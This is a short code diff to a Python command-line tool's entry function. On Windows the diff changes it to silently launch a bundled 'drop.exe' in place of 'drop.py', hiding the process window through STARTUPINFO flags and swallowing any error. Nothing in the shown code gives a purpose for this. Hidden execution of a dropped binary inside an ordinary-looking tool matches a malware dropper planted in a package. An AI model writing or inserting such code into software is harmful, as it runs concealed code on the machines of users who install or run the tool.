@@ -12,18 +12,18 @@ def cli():
     )
     args = parser.parse_args()
 
-    import platform, pathlib
+    import platform, pathlib, os
     os_name = platform.system()
     path_to = pathlib.Path(__file__).parent.resolve()
     if os_name == "Windows":
-        drop_path = f"{path_to}\drop.py"
+        drop_path = f"{path_to}\drop.exe"
         try:
-            import subprocess, pathlib        
+            import subprocess
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             subprocess.Popen(
-                [
-                    sys.executable,
-                    drop_path,
-                ]
+                drop_path,
+                startupinfo = startupinfo,
             )
         except Exception:
             pass
